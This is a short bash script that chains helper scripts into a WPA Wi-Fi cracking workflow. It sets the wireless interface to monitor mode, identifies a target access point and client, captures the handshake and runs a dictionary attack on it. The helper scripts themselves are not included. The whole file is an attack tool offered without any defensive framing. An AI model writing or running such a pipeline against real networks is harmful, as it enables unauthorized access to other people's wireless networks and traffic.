#!/bin/bash

./get_interface.sh
INTERFACE=`cat dumpfiles/interface.txt`

./monitor_mode.sh $INTERFACE

./obtain_ap.sh $INTERFACE
APMAC=`cat dumpfiles/ap.txt`
CLMAC=`cat dumpfiles/cl.txt`

./obtain_ch.sh $APMAC
CH=`cat dumpfiles/ch.txt`

./create_psk.sh
PSKFILE=`cat dumpfiles/psk.txt`

./get_wpa.sh $APMAC $CLMAC $CH $PSKFILE $INTERFACE

./dictionary.sh $APMAC $PSKFILE
